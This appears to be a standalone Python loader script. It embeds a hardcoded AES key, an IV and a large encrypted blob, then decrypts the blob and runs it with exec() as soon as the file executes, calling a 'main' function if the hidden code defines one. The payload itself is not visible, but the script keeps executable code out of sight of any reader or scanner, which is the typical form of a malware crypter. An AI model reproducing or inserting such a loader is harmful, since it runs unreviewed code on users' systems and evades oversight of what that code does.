
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

def decrypt_script(encrypted_data, iv, key):
    # Create AES cipher with CBC mode
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    # Return decrypted Python code
    return decrypted_data.decode('utf-8')

def execute_decrypted_script(decrypted_code):
    # Create a new dictionary for the execution context
    exec_globals = {}
    
    # Dynamically execute the decrypted Python code in the new context
    exec(decrypted_code, exec_globals)

    # Now you can call the functions from the executed code
    # For example, if 'main' is defined in the decrypted code, it can be called as follows:
    if 'main' in exec_globals:
        exec_globals['main']()

# Example: Replace this with your actual encryption key (must be the same as used for encryption)
key = b'T\x9c\x06\xdf\xcb\xca\xa0\x19\xd0\t\xae\xf6\xb7T\xf3\xa9hR\x0f\x01\x04Y\xb5\x19;\xb7`\xf8@\x1f,\x86'

# Embedded encrypted data and IV
iv = b'\x1d5p\xda\x16\x12\x91ej\x13\xcd1\xc7\xee\xe6t'  # 16 bytes IV (Initialization Vector)
encrypted_data = b'$V\x11\xb0|\xdd\xcc\x98\xe7\xbe\xb0%\x84\xea\xb8\xe7\xd1?\x87\x8a\x0fp?\xed\x8f\xbb\xbd\xe7\x81Tc\xb7\x1c\xf3\xc6s\xba\x00G\xe5xZ\xab\x8f\x97ft\xa5q\xd9\xa4\x9d\xdf9?z\xe6\xb5\x97s5\xcd\xa9\x1c\xa3\xd7\xaf\xa4\xad\xd4\xe9\xe82a\xf5\xdb\xc0\x96\xc5\xe3\x9e\xca\xbcr\x14\xac7\xf6\x11SB\xc6sM\x8a\xe7\xd6\xa8\xbaA\xce\xc5\xb0\xd1\x91}\x0fn\xf8\xfcY\x9fx\xf6/F\x9cC\xd1-\xeeZ\nC\x9b.ia\xc5\xfb\x8a\x87\x91Z$[\xd2C-\xda~\xb3\xc0\xb8\xf1Rs\x13r\x13\xc0\xf4!Tj\x85\x05\x98\x0c\xea\xbc\xe8\x00]_\\\x03\x05A\x07\xb3N\xb1F\x954\xeb\xe4\x05\xa9E\xc0\x93j]in>\x15d\xd0D9_.\xa8%\r!"\xbd`\xaf\n\xa8<\xd5\x94\xf4{\x8e\x17A+}I\x04!\xdc:\xe4\x87\xacvlxg\xea\xd9\xb3\x83\x95a\xf6\xa8\xcc\xa7#\x8al+\xa8\xe9\xd7\xf1\xcee?\xee\x92\x97\x80\x16\xb3j\xbd=p\xf4y(\x1d\xf6\xb5\xf1\xb1\x1a.\xb8\x01X\x9f\xc2\xc80D\x04\xc1\xa0?\xa5\xcc\x06\x17E\xa6k\xf4\xe1J\xbf\x80\x17\xd1m\xdc\xcb\xa7\xf4\xf7\xd7\xcc\xdf\xe0\xbaT\x94\xaf\xe1\x83|\x9du a\xff\xbdb9T\xe1\xfee\xbf\xf58\xdb,\xd1A\xad2B\\\xeb\x17\x15_Gq\xfd\x84\\\xc4\x0c\xb1\x99\x9b\xc6y\xe5\x1d\x8c\r\xd1\x96D\x9a\xbdI\x97"\xa0\xb3)\x8ad\r\xc9\x119\xe8\xae\xa0\x99\xd7\x8c\xd2\xcfU\x18\xdb\xd12\xb3\x00\x95u\x8d\x15u\xc1\x0c\xa5;+w\xe2\xe2s(m\xb2+e\x04\xd2\x92iK\x80v*\xa8\x85\x06|\x02?\xbb\x0c5\xf85\n\x99F\x9b\xa5\xf0BM\xa4\xf5w\xb41?F#G\xf6\x0f\xa6CV\xe6\x15?\xca\x9dI\xde\tP\xd3\x02\xec\x8d\xc6\xd4\xb1\x8c\xd8<)(\xc5\xf0\xf3K\xf0u\xa6\xb7\x90\xf9,e\xbd\xb1[\xee\xfb;-\xa29\x84+\x8d\x1f\xa3\xd1\xdd:\x88\x82\x10\xa5\x02&\xd7\xa9\xc1\xa1/\xfbd\xc7\xa9\xe9\xc1\x1d%\xa30\x8d\xd4\xca{_\x90\xcbF\xceo\x95\xba\x030\xe0\xd4\xba\x16\xc1\xf9\xec\xb03gtN\xe1`\xbbg\xd4\x05\xe3\x82ET#\xc8\x92*\x19\xbe\xcf\xcb#\xdc^8\xe7\xcdgG\x90^C\xcf=\x01\xbf\x93\x81\xdd\x12\x1d\x7f\xd5@M\xfa\x93\x87P\x11|\x19\x1d\xdb\xec\xaf\x94uAM0m\x9e\xc9\x9e\x01 \xab\x00_\xfaC\xf3\xd2\xd9b\'f\x1c\xb1\xa0\x91M\x9e\xcc\xaf2y\x10\xd4\xfd\xd7\x01E\xb3\xa4\x90L\x8c\xf0\x9b\x95\xcf9\xfc=DB\x87\x86K\x12\x87\xf0\xdd\xcf\xdc\n\x99\xa5\xf6\x0c9\x99:\xa8\xa3^4\xa6v\x82\x0b\xfd\xd6\xce\xfb\xba~_\x1b\n\x9fm*\xbfR\xfeg\xad\x94\x0c\xa6\xc98\t\xab\xd3\xefi\xa0\xe9bD\xcba:Z\xd77\xfd\x979\xae\x8c>&s\x95\xda\x182\xa7\xcd\xfe\xc1\x14\x15\xc1\x9e)y\xa1U\xb9C\x1bcN\t\xc5\xb2\xa2z\xa7\x83l\x07 \xe9\xfev~H:A\x13l\xf0\x03\xf4\xaeaEQ\xac\xa5\x82\xdcxM\x86o\xf5\x0e\xdfY\xc28\xf9+lE\xac\xb8?t\xaf\x84\x1f@\xae2\xaa\x12i2\xdfFd6\x10\xfa^\x9e.\x85<\x97\xd0\xeb\x15\x9f"\xf6\xb5\x9d%%\x19\xf9[x\x87\xcc\x08\xa5\xd1\xfe\x9a\x18 \x83\x7f\xce4j\x97\x96`\r\xea\x98,OH\x17\xb9\xc9\xb3\x02\xd0pr%\xafO\xf0\x8a(m\xb2\xe39N\xdd#\xc6\x1c\xf5\xf9D\xa7n\xf0@\xe4y0\xda_R\xfcZ\x0b\xee#9\xd6\x98\xfez\x14\x0b\xfb\x12.\xca\xaa\x0c0\xf3\xfa\x1f\xdc\xc1% n\xc1\xe7\x8bbXE\x08<\xaa\xcaC\xcdq\xc1\xaa\xdf\x9e\xc9&EH;\x8c^_\xd8\xcf\x01\x1a\x83\xa3K\xfa#\xd1\xb5\xb9{\x07u\xb4$\xa7\xabIW\xdfucX\x00\x01\x8a\xd4f\xbb\x94O\x03\x13_ZY\x13\x93\x90^Q\xc0\xf0\x06\xc6s\xf0\xd4\xf6\x16\xf1\x9b}\xe9\xb4\xba\xa8Q\x8d\xb1\x98\xc0x\xde\xbf\x06;\x8aJi\xfcH\xa0C\x8fx\xfc\x04S\xd7\x907\x17\xdd\x82\x87\xc1\x8c]\xf6/\x954\xba\x8e\x98\x04\x97\xdb\xdb\xfd\x96\x9e):\x05\xac\xe4\x9d\x85\x1eG\xd9\xcc\xbb9\xaf\xec\x08\xec\xd1G\xadLp@-\xfb\xcf\x12K\x0e\x1f2\xef\xee\x10\x99\xaa\xd1)\x93\xfd\x01\xa9LF\xab\x8b,\x8f\x10\x99,\xe7<\xf1s=PR\x05\x0f(v\xc5Y\xa4'  # This is the encrypted code

# Decrypt and execute the code
decrypted_code = decrypt_script(encrypted_data, iv, key)
execute_decrypted_script(decrypted_code)
